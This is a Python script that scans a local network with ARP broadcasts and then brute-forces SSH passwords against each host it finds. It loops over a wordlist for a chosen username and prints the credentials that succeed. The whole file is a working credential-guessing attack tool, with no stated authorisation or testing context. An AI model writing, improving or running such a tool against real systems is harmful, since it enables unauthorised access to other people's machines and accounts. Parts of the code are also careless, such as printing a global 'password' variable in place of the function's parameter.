import os
import scapy.all as scapy
import argparse
from scapy.layers.l2 import ARP, Ether
import paramiko
import time
import multiprocessing


def args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--range", required=True)
    parser.add_argument("-u", "--user", required=True)
    parser.add_argument("-w", "--wordlist", required=True)
    return parser.parse_args()


def scan_range(ip_range):
    p = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    ans, _ = scapy.srp(p, timeout=3)
    res = []
    for s, r in ans:
        res.append(r.psrc)
    return res


def ssh_connect(ip_addr, passwd):
    proc = os.getpid()
    ssh = paramiko.SSHClient()
    ssh.load_system_host_keys()  # default .ssh/known_hosts ssh.load_host_keys("~/.ssh/known_hosts) - custom
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(hostname=ip_addr, username=options.user, password=passwd, timeout=1)
        stdin, stdout, stderr = ssh.exec_command("whoami")
        # print(stdin)
        # print(stderr.read())
        print("\033[32m{}".format("Successfully connected") + "\033[0m{}".format(" IP ")  + "\033[31m{}".format(ip_addr)
              + "\033[0m{}".format(" USER ") + "\033[31m{}".format(options.user)
              + "\033[0m{}".format(" PASSWORD ") + "\033[31m{}".format(password) + "\033[0m{}".format(" "))
        # print(stdout.read().decode("UTF-8"))
        ssh.close()
        return
    except:
        print("process id " + str(proc))
        print("no connection for " + ip_addr + " " + options.user + "/" + password)




if __name__ == "__main__":
    start = time.time()
    options = args()
    procs = []
    devices = scan_range(options.range)
    n_proc = multiprocessing.cpu_count()
    print("processors count = " + str(n_proc))
    print(devices)
    f = open(options.wordlist, "r")
    lines = f.read().splitlines()
    for i in devices:
        for password in lines:
            proc = multiprocessing.Process(target=ssh_connect, args=(i, password))
            procs.append(proc)
            proc.start()
        for proc in procs:
            proc.join()
    f.close()
    end = time.time()
    print(end - start)
